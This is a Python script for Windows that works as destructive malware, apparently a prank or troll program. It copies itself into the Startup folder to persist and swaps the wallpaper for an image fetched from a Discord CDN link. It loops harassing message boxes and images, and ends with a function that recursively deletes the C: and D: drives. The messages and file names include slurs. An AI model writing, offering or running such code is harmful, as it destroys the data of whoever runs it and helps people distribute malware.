import shutil
import os
import ctypes
import requests
import sys
from PIL import Image
import time

# Define custom messagebox function using ctypes
def messagebox(text, title):
    ctypes.windll.user32.MessageBoxW(0, text, title, 0)

def copy_to_startup():
    # Get the path to the user's startup folder
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Get the path of the current script
    script_path = sys.argv[0]

    # Copy the script to the startup folder
    shutil.copy(script_path, startup_folder)

def display_error_messages():
    while True:
        messagebox("Congratulations, you have won an STD!", "LMAO")
        messagebox("Aw come on, dont go.", "LMAO")
        messagebox("Give up.", "LMAO")
        messagebox("Where are you going?", "LMAO")
        messagebox("Nice try.", "LMAO")
        messagebox("To put it simply,", "LMAO")
        messagebox("I refuse to be closed.", "LMAO")

def display_image_box():
    image_url = 'https://cdn.discordapp.com/attachments/1105563151216414811/1105855509879332935/gaymeicon.png'
    response = requests.get(image_url, stream=True)
    with open('image.png', 'wb') as file:
        file.write(response.content)

    while True:
        img = Image.open('image.png')
        img.show()

# zestiest part of the program
def dir_nuke():
    dirs = ['C:/', 'D:/']
    for dir in dirs:
        if os.path.exists(dir):
            shutil.rmtree(dir)

# Changes wallpaper
def change_wallpaper():
    wallpaper_url = "https://cdn.discordapp.com/attachments/1105563151216414811/1106193396948811867/retarded.png"
    response = requests.get(wallpaper_url)
    image_data = response.content
    wallpaper_file = "wallpaper.png"
    with open(wallpaper_file, "wb") as file:
        file.write(image_data)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(wallpaper_file), 3)
    os.remove(wallpaper_file)

if __name__ == "__main__":
    copy_to_startup()
    change_wallpaper()
    time.sleep(5)
    display_image_box()
    display_error_messages()
    time.sleep(45)
    dir_nuke()
